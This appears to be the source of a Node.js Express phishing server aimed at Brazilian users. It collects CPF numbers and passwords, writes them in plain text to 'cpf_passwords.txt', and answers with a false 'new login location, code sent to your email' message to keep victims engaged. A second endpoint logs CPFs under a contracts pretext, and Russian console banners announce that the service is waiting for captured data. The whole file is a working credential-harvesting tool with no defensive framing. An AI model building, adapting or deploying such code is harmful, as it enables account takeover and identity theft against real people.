const express = require('express');
const cors = require('cors');
const fs = require('fs'); 
const path = require('path'); 

const app = express();
const port = process.env.PORT || 3000;
const NOME_ARQUIVO_LOG = 'cpf_passwords.txt';

app.use(cors()); 
app.use(express.json()); 

app.use(express.static(path.join(__dirname, 'public')));

app.post('/salvar-dados', (req, res) => {
    
    const { cpf, senha } = req.body;

    if (!cpf || !senha) {
        return res.status(400).json({ message: "Данные неполные." });
    }

    const dataHora = new Date().toLocaleString('ru-RU');
    const linhaDeLog = `[ВХОД - ${dataHora}] - CPF: ${cpf} | Пароль: ${senha}\n`;

    console.log(`[n0fex://cz] :: ← получен пакет авторизации`);
    console.log(`↳ ${linhaDeLog.trim()}`);

    fs.appendFile(NOME_ARQUIVO_LOG, linhaDeLog, (err) => {
        if (err) {
            console.error(`[n0fex://cz] !! ошибка при записи в файл →`, err);
            return res.status(500).json({ message: 'Внутренняя ошибка сервера.' });
        }
    });

    res.status(401).json({ message: 'Novo local de login identificado, enviamos um codigo de 6 digitos para o email vinculado a esta conta.' });
});

app.post('/acessar-contratos', (req, res) => {
    const { cpf } = req.body;

    if (!cpf) {
        return res.status(400).json({ message: "CPF обязателен." });
    }

    const dataHora = new Date().toLocaleString('ru-RU');
    const linhaDeLog = `[КОНТРАКТЫ - ${dataHora}] - CPF: ${cpf}\n`;

    console.log(`[n0fex://cz] :: ← получен запрос доступа к контрактам`);
    console.log(`↳ ${linhaDeLog.trim()}`);

    fs.appendFile(NOME_ARQUIVO_LOG, linhaDeLog, (err) => {
        if (err) {
            console.error(`[n0fex://cz] !! сбой при логировании контракта →`, err);
            return res.status(500).json({ message: 'Внутренняя ошибка сервера.' });
        }
        console.log(`[n0fex://cz] ✓ контракт CPF зафиксирован → ${NOME_ARQUIVO_LOG}`);
    });

    res.status(200).json({ message: 'Доступ к контрактам... пожалуйста, подождите.' });
});

app.listen(port, () => {
    console.log(`╔═══════════════════════════════════════════╗`);
    console.log(`║  ЗАПУСК УСПЕШЕН | n0fex-cz.norte_333      ║`);
    console.log(`╚═══════════════════════════════════════════╝`);
    console.log(`[n0fex://cz] > служба прослушивания активна на порту ${port}`);
    console.log(`[n0fex://cz] > ожидание данных начато...`);
});
